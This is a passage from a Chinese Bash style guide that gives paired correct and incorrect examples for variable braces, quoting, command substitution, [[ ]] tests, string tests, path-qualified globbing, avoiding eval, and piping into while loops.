正例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 位置变量和特殊变量，可以不用大括号:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo "Positional: $1" "$5" "$3"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo "Specials: !=$!, -=$-, _=$_. ?=$?, #=$# *=$* @=$@ \$=$$ ..."</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 当位置变量大于等于10，则必须有大括号:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo "many parameters: ${10}"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 当出现歧义时，必须有大括号:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Output is "a0b0c0"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set -- a b c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo "${1}0${2}0${3}0"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 使用变量扩展赋值时，必须有大括号：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DEFAULT_MEM=${DEFUALT_MEM:-"-Xms2g -Xmx2g -XX:MaxDirectMemorySize=4g"}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 其他常规变量的推荐处理方式:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo "PATH=${PATH}, PWD=${PWD}, mine=${some_var}"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">while read f; do</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    echo "file=${f}"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">done &lt; &lt;(ls -l /tmp)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>反例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 无引号, 无大括号, 特殊变量，单字符变量</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo a=$avar "b=$bvar" "PID=${$}" "${1}"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 无大括号产生歧义场景：以下会被解析为 "${1}0${2}0${3}0",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 而非 "${10}${20}${30}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set -- a b c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo "$10$20$30"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="变量引用---推荐--">变量引用 <sup>  <em>推荐</em>  </sup><a class="hash-link" href="#变量引用---推荐--" title="标题的直接链接">​</a></h4><p>变量引用通常情况下应遵循以下原则：</p><ul><li>默认情况下推荐使用引号引用包含变量、命令替换符、空格或shell元字符的字符串</li><li>在有明确要求必须使用无引号扩展的情况下，可不用引号</li><li>字符串为单词类型时才推荐用引号，而非命令选项或者路径名</li><li>不要对整数使用引号</li><li>特别注意 <code>[[</code> 中模式匹配的引号规则</li><li>在无特殊情况下，推荐使用 <code>$@</code> 而非 <code>$*</code></li></ul><p>以下通过示例说明：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># '单引号' 表示禁用变量替换</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># "双引号" 表示需要变量替换</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 示例1： 命令替换需使用双引号</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag="$(some_command and its args "$@" 'quoted separately')"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 示例2：常规变量需使用双引号</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo "${flag}"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 示例3：整数不使用引号</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">value=32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 示例4：即便命令替换输出为整数，也需要使用引号</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">number="$(generate_number)"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 示例5：单词可以使用引号，但不作强制要求</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">readonly USE_INTEGER='true'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 示例6：输出特殊符号使用单引号或转义</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo 'Hello stranger, and well met. Earn lots of $$$'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo "Process $$: Done making \$\$\$."</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 示例7：命令参数及路径不需要引号</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">grep -li Hugo /dev/null "$1"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 示例8：常规变量用双引号，ccs可能为空的特殊情况可不用引号</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git send-email --to "${reviewers}" ${ccs:+"--cc" "${ccs}"}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 示例9：正则用单引号，$1可能为空的特殊情况可不用引号</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">grep -cP '([Ss]pecial|\|?characters*)$' ${1:+"$1"}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 示例10：位置参数传递推荐带引号的"$@"，所有参数作为单字符串传递用带引号的"$*"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># content of t.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">func_t() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    echo num: $#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    echo args: 1:$1 2:$2 3:$3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">func_t "$@"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">func_t "$*"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 当执行 ./t.sh a b c 时输出如下：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">num: 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">args: 1:a 2:b 3:c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">num: 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">args: 1:a b c 2: 3:</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="命令替换">命令替换<a class="hash-link" href="#命令替换" title="标题的直接链接">​</a></h4><p>使用 <code>$(command)</code> 而不是反引号。</p><p>因反引号如果要嵌套则要求用反斜杠转义内部的反引号。而 <code>$(command)</code> 形式的嵌套无需转义，且可读性更高。</p><p>正例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">var="$(command "$(command1)")"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>反例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">var="`command \`command1\``"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="条件测试">条件测试<a class="hash-link" href="#条件测试" title="标题的直接链接">​</a></h4><p>使用 <code>[[ ... ]]</code> ，而不是 <code>[</code> , <code>test</code> , 和 <code>/usr/bin/[</code> 。</p><p>因为在 <code>[[</code> 和 <code>]]</code> 之间不会出现路径扩展或单词切分，所以使用 <code>[[ ... ]]</code> 能够减少犯错。且 <code>[[ ... ]]</code> 支持正则表达式匹配，而 <code>[ ... ]</code> 不支持。
参考以下示例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 示例1：正则匹配，注意右侧没有引号</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 详尽细节参考：http://tiswww.case.edu/php/chet/bash/FAQ 中E14部分</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if [[ "filename" =~ ^[[:alnum:]]+name ]]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    echo "Match"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 示例2：严格匹配字符串"f*"(本例为不匹配)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if [[ "filename" == "f*" ]]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    echo "Match"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 示例3：[]中右侧不加引号将出现路径扩展，如果当前目录下有f开头的多个文件将报错[: too many arguments</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if [ "filename" == f* ]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    echo "Match"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="字符串测试">字符串测试<a class="hash-link" href="#字符串测试" title="标题的直接链接">​</a></h4><p>尽可能使用变量引用，而非字符串过滤。</p><p>Bash可以很好的处理空字符串测试，请使用空/非空字符串测试方法，而不是过滤字符，让代码具有更高的可读性。
正例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">if [[ "${my_var}" = "some_string" ]]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    do_something</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>反例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">if [[ "${my_var}X" = "some_stringX" ]]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    do_something</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>正例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 使用-z测试字符串为空</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if [[ -z "${my_var}" ]]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    do_something</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>反例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 使用空引号测试空字符串，能用但不推荐</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if [[ "${my_var}" = "" ]]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    do_something</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>正例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 使用-n测试非空字符串</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if [[ -n "${my_var}" ]]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    do_something</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>反例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 测试字符串非空，能用但不推荐</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if [[ "${my_var}" ]]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    do_something</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="文件名扩展">文件名扩展<a class="hash-link" href="#文件名扩展" title="标题的直接链接">​</a></h4><p>当进行文件名的通配符扩展时，请指定明确的路径。</p><p>当目录中有特殊文件名如以 <code>-</code> 开头的文件时，使用带路径的扩展通配符 <code>./*</code> 比不带路径的 <code>*</code> 要安全很多。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 例如目录下有以下4个文件和子目录：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># -f  -r  somedir  somefile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 未指定路径的通配符扩展会把-r和-f当作rm的参数，强制删除文件：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">psa@bilby$ rm -v *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">removed directory: `somedir'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">removed `somefile'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 而指定了路径的则不会:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">psa@bilby$ rm -v ./*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">removed `./-f'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">removed `./-r'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rm: cannot remove `./somedir': Is a directory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">removed `./somefile'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="慎用eval">慎用eval<a class="hash-link" href="#慎用eval" title="标题的直接链接">​</a></h4><p>应该避免使用eval。</p><p>Eval在用于分配变量时会修改输入内容，但设置变量的同时并不能检查这些变量是什么。
反例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 以下设置的内容及成功与否并不明确</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">eval $(set_my_variables)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="慎用管道连接while循环">慎用管道连接while循环<a class="hash-link" href="#慎用管道连接while循环" title="标题的直接链接">​</a></h4><p>请使用进程替换或者for循环，而不是通过管道连接while循环。</p><p>这是因为在管道之后的while循环中，命令是在一个子shell中运行的，因此对变量的修改是不能传递给父shell的。</p><p>这种管道连接while循环中的隐式子shell使得bug定位非常困难。
反例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">last_line='NULL'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">your_command | while read line; do</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    last_line="${line}"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">done</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 以下会输出'NULL'：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo "${last_line}"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>如果你确定输入中不包含空格或者其他特殊符号（通常不是来自用户输入），则可以用for循环代替。
例如：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">total=0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 仅当返回结果中无空格等特殊符号时以下可正常执行：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">for value in $(command); do</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    total+="${value}"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">done</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 